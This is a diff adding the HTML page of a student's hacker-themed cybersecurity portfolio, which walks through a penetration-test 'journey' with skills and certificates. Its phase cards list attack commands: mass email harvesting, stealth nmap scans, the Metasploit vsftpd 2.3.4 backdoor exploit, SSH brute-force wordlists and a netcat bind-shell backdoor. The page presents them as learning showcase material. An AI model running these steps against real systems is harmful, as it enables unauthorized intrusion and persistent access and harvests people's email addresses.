@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMK Telkom Journey - Muhammad Faris Anshori</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="matrix-overlay"></div>
+    
+    <div class="terminal-container">
+        <div class="terminal-header">
+            <div class="terminal-buttons">
+                <div class="btn close"></div>
+                <div class="btn minimize"></div>
+                <div class="btn maximize"></div>
+            </div>
+            <div class="terminal-title">root@faris-anshori:~ (CyberSec_Portfolio)</div>
+            <div class="terminal-status">
+                <span class="status-dot"></span>
+                <span class="status-text">SYSTEM ACTIVE</span>
+            </div>
+        </div>
+        
+        <div class="terminal-content">
+            <div class="center-header">
+                <h1 class="glitch-text" data-text="TELKOM_JOURNEY">TELKOM JOURNEY</h1>
+                <p class="user-info">Muhammad Faris Anshori | X TKJ 4 | SMK Telkom Malang</p>
+                <div class="separator"><span>⚡ DATABASE LOGS ACCESSED ⚡</span></div>
+            </div>
+
+            <div class="timeline-v2">
+                <div class="main-line"></div>
+
+                <div class="step-container">
+                    <div class="step-marker">01</div>
+                    <div class="step-card reveal-effect">
+                        <div class="step-header"><i class="fas fa-search"></i> <h3>INFORMATION GATHERING</h3></div>
+                        <p class="step-date">PHASE: RECONNAISSANCE</p>
+                        <p class="step-desc">Tahap awal mengumpulkan informasi target melalui domain, IP, dan email address.</p>
+                        <div class="technical-log">
+                            <code>$ whatweb -v --log-verbose=target_info.txt [url]</code>
+                            <p>// Identifikasi teknologi web dengan log yang rapi.</p>
+                            <code>$ theHarvester -d domain.com -b google -l 500</code>
+                            <p>// Mencari email & domain dari source publik.</p>
+                            <code>$ emailscraper.py [target_url]</code>
+                            <p>// Script Python custom untuk mengekstrak alamat email secara massal.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="step-container">
+                    <div class="step-marker">02</div>
+                    <div class="step-card reveal-effect">
+                        <div class="step-header"><i class="fas fa-satellite-dish"></i> <h3>NETWORK SCANNING</h3></div>
+                        <p class="step-date">PHASE: ENUMERATION</p>
+                        <p class="step-desc">Melakukan pemindaian port dan host aktif untuk mencari celah keamanan.</p>
+                        <div class="technical-log">
+                            <code>$ netdiscover -r 192.168.1.0/24</code>
+                            <p>// Melacak IP dalam range jaringan untuk mengetahui host di sekitar.</p>
+                            <code>$ nmap -sS -Pn -O -p- [target_ip]</code>
+                            <p>// Stealth SYN Scan & OS Detection pada semua port (Gunakan panah bawah untuk cek progress).</p>
+                            <code>$ portscanner.py --target [ip]</code>
+                            <p>// Tools buatan saya sendiri sebagai alternatif Nmap.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="step-container">
+                    <div class="step-marker">03</div>
+                    <div class="step-card highlight reveal-effect">
+                        <div class="step-header"><i class="fas fa-biohazard"></i> <h3>EXPLOITATION PHASE</h3></div>
+                        <p class="step-date">PHASE: GAINING ACCESS</p>
+                        <p class="step-desc">Mengeksploitasi celah pada vsFTPd 2.3.4 dan layanan remote lainnya.</p>
+                        <div class="technical-log">
+                            <code>msf > search vsftpd</code>
+                            <code>msf > use exploit/unix/ftp/vsftpd_234_backdoor</code>
+                            <code>msf > set RHOSTS [target] && exploit</code>
+                            <p>// Akhirnya kita bisa mengontrolnya dari Kali Linux mwhehehee.</p>
+                            <code>$ vncviewer [target_ip]</code>
+                            <p>// Mengontrol target via GUI (Asli lebih mudah tapi harus pakai password).</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="step-container">
+                    <div class="step-marker">04</div>
+                    <div class="step-card reveal-effect">
+                        <div class="step-header"><i class="fas fa-user-secret"></i> <h3>POST-EXPLOITATION</h3></div>
+                        <p class="step-date">PHASE: MAINTAINING ACCESS</p>
+                        <div class="technical-log">
+                            <code>$ crunch 6 8 -o wordlist.txt</code>
+                            <p>// Membuat custom wordlist untuk SSH Bruteforce.</p>
+                            <code>$ telnet [target_ip]</code>
+                            <p>// Remote access berbasis teks terminal.</p>
+                            <code>$ netcat [target_ip] [port]</code>
+                            <p>// Bind Shell Backdoor untuk akses masuk kembali.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-divider"><span>[ SYSTEM_SKILLS ]</span></div>
+            <div class="skill-wrapper">
+                <div class="skill-item">
+                    <div class="skill-info"><span>Networking & Subnetting</span><span>85%</span></div>
+                    <div class="skill-bar"><div class="skill-fill" data-width="85%"></div></div>
+                </div>
+                <div class="skill-item">
+                    <div class="skill-info"><span>Linux System (Kali/Debian)</span><span>80%</span></div>
+                    <div class="skill-bar"><div class="skill-fill" data-width="80%"></div></div>
+                </div>
+                <div class="skill-item">
+                    <div class="skill-info"><span>Vulnerability Assessment (Nessus)</span><span>70%</span></div>
+                    <div class="skill-bar"><div class="skill-fill" data-width="70%"></div></div>
+                </div>
+            </div>
+
+            <div class="section-divider"><span>[ VERIFIED_CERTIFICATES ]</span></div>
+            <div class="cert-gallery">
+                <div class="cert-card reveal-effect">
+                    <div class="cert-img-container">
+                        <img src="https://raw.githubusercontent.com/muhammadanshori34tkj-web/sertifgabut/main/Muhammad%20Faris%20Anshori%20Sertifikat%20Webinar%20IT%20Cyber%20Security%2027%20Januari%202026_page-0001.jpg" alt="Sertifikat JCC 2025">
+                    </div>
+                    <div class="cert-info">
+                        <h4>Basic Mobile Pentesting</h4>
+                        <p>ID-Networkers (Webinar IT 2026)</p>
+                    </div>
+                </div>
+                <div class="cert-card reveal-effect">
+                    <div class="cert-img-container">
+                        <img src="https://raw.githubusercontent.com/muhammadanshori34tkj-web/sertifgabut/main/WhatsApp%20Image%202026-03-06%20at%2009.00.31.jpeg" alt="Sertifikat JCC 2025">
+                    </div>
+                    <div class="cert-info">
+                        <h4>Jatim Cybersecurity Competition 2025</h4>
+                        <p>Dinas Komunikasi dan Informatka Provinsi Jawa Timur</p>
+                    </div>
+                </div>
+                <div class="cert-card reveal-effect">
+                    <div class="cert-img-container">
+                        <img src="https://raw.githubusercontent.com/muhammadanshori34tkj-web/sertifgabut/main/Muhammad%20Faris%20Anshori%20Sertifikat%20Webinar%20IT%20Cyber%20Security%2029%20Januari%202026_page-0001.jpg" alt="Sertifikat Security">
+                    </div>
+                    <div class="cert-info">
+                        <h4>Sistem Keamanan Dari Nol</h4>
+                        <p>ID-Networkers (Webinar IT 2026)</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="console-box">
+                <div id="output-log">
+                    <div>> Initializing session... [OK]</div>
+                    <div>> Welcome back, Faris. Type 'help' for commands.</div>
+                </div>
+                <div class="input-area">
+                    <span>root@faris:~$</span>
+                    <input type="text" id="cmd-input" autofocus autocomplete="off">
+                </div>
+            </div>
+
+            <div class="navigation-center">
+                <a href="../index.html" class="nav-btn back-btn"><i class="fas fa-arrow-left"></i> EXIT TERMINAL</a>
+                <button class="nav-btn reset-btn" id="reset-journey"><i class="fas fa-sync-alt"></i> REBOOT LOGS</button>
+            </div>
+        </div>
+
+        <div class="terminal-footer">
+            <span id="current-time"></span>
+            <span class="blink">█ STATUS: PRIVILEGED_STUDENT</span>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
